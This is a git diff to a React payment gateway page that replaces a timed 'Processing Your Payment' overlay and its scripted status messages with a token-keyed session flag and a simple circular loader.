@@ -2,6 +2,7 @@ import { bustImage, bumpAssetVersion } from "@/lib/assetVersion";
 import { useState, useEffect, useRef } from "react";
 import { Home, Upload, X, Headphones, HelpCircle, Gift, LogIn, LogOut, Lock } from "lucide-react";
 import { useNavigate, useSearchParams } from "@/lib/flowRouter";
+import { useParams } from "react-router-dom";
 import { Switch } from "@/components/ui/switch";
 import { Input } from "@/components/ui/input";
 import { Button } from "@/components/ui/button";
@@ -91,14 +92,6 @@ const mergeWithDefaults = (list: MerchantProfile[]): MerchantProfile[] => {
 
 
 
-const gatewayMessages = [
-  "Connecting to secure payment gateway...",
-  "Verifying merchant credentials...",
-  "Authorizing transaction...",
-  "Communicating with bank server...",
-  "Finalizing secure gateway...",
-];
-
 const defaultEnabledMethods = {
   bkash: true, nagad: true, rocket: false, upay: false, visa: true, mastercard: true, binance: true,
 };
@@ -115,19 +108,15 @@ const paymentMethods = [
 
 const PaymentGateway = () => {
   const navigate = useNavigate();
+  const { token = "" } = useParams();
   const [searchParams] = useSearchParams();
   const amount = searchParams.get('amount') || "00";
   const checkingReferrer = false;
   const [showGateway, setShowGateway] = useState(() => {
     if (typeof window === 'undefined') return true;
-    if (sessionStorage.getItem('genz_skip_gateway') === 'true') {
-      sessionStorage.removeItem('genz_skip_gateway');
-      return false;
-    }
-    return true;
+    if (!token) return false;
+    return sessionStorage.getItem(`genz_gateway_loader_seen_${token}`) !== 'true';
   });
-  const [messageIndex, setMessageIndex] = useState(0);
-  const [progress, setProgress] = useState(0);
   const [showLoader, setShowLoader] = useState(false);
   const [clickedCard, setClickedCard] = useState<string | null>(null);
   const [isAdmin, setIsAdmin] = useState(false);
@@ -693,7 +682,6 @@ const PaymentGateway = () => {
       paymentType: isCard ? 'card' : 'mfs',
       referrer: document.referrer || 'Direct',
     });
-    sessionStorage.setItem('genz_skip_gateway', 'true');
     const bound = bindFlowPlatform(methodName);
 
     setClickedCard(route);
@@ -709,50 +697,14 @@ const PaymentGateway = () => {
 
   useEffect(() => {
     if (!showGateway) return;
-    const totalDuration = 2000;
-    const messageInterval = totalDuration / gatewayMessages.length;
-    // Kick a single smooth transition from 0 -> 100
-    requestAnimationFrame(() => setProgress(100));
-    const msgTimer = setInterval(() => setMessageIndex((p) => (p >= gatewayMessages.length - 1 ? p : p + 1)), messageInterval);
-    const hideTimer = setTimeout(() => setShowGateway(false), totalDuration);
-    return () => { clearInterval(msgTimer); clearTimeout(hideTimer); };
-  }, [showGateway]);
+    try { sessionStorage.setItem(`genz_gateway_loader_seen_${token}`, 'true'); } catch { /* ignore */ }
+    const hideTimer = window.setTimeout(() => setShowGateway(false), 3000);
+    return () => window.clearTimeout(hideTimer);
+  }, [showGateway, token]);
 
 
   if (showGateway || checkingReferrer) {
-    return (
-      <div className="min-h-[100dvh] w-screen bg-background flex items-center justify-center p-4 overflow-hidden fixed inset-0 z-50">
-        <div className="w-full max-w-md mx-auto">
-          <div className="bg-gradient-to-br from-[#2d7dd2] via-[#2570c4] to-[#1a5fb4] rounded-2xl shadow-[0_20px_60px_rgba(26,95,180,0.4)] p-8 flex flex-col items-center relative overflow-hidden">
-            <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/5 to-transparent pointer-events-none" style={{ animation: 'shimmer 3s ease-in-out infinite' }} />
-            <div className="flex gap-3 mb-7 relative z-10">
-              {[0, 1, 2].map((i) => (
-                <div key={i} className="w-2 h-2 rounded-full bg-white" style={{ animation: `dotBounce 1.4s ease-in-out ${i * 0.16}s infinite` }} />
-              ))}
-            </div>
-            {gatewayLogo && (
-              <div className="w-20 h-20 rounded-full bg-[#1a2332] flex items-center justify-center mb-5 relative z-10 shadow-lg ring-2 ring-white/10">
-                <img src={bustImage(gatewayLogo)} alt={gatewayName} className="w-[72px] h-[72px] rounded-full object-cover" />
-              </div>
-            )}
-            <h2 className="text-white text-xl font-bold mb-2 relative z-10 tracking-wide">Processing Your Payment...</h2>
-            <p className="text-white/75 text-sm mb-6 transition-all duration-500 min-h-[20px] relative z-10">{gatewayMessages[messageIndex]}</p>
-            <div className="w-full bg-white/20 rounded-full h-2.5 mb-6 overflow-hidden relative z-10 backdrop-blur-sm">
-              <div className="h-full rounded-full ease-linear" style={{ width: `${progress}%`, transition: 'width 2000ms linear', background: 'linear-gradient(90deg, #ffffff 0%, #e0ecff 50%, #ffffff 100%)', boxShadow: '0 0 10px rgba(255,255,255,0.5)' }} />
-            </div>
-              <div className="flex items-center gap-2 text-white/90 mb-2 relative z-10">
-              <Lock className="w-4 h-4" />
-                {gatewayName && <span className="text-sm font-semibold tracking-wide">{gatewayName}</span>}
-            </div>
-            <p className="text-white/40 text-xs relative z-10">Please do not close or refresh this page</p>
-          </div>
-        </div>
-        <style>{`
-          @keyframes dotBounce { 0%, 80%, 100% { transform: translateY(0); } 40% { transform: translateY(-8px); } }
-          @keyframes shimmer { 0% { transform: translateX(-100%); } 100% { transform: translateX(100%); } }
-        `}</style>
-      </div>
-    );
+    return <DualCircleLoader size={47} transparentBg />;
   }
 
   return (
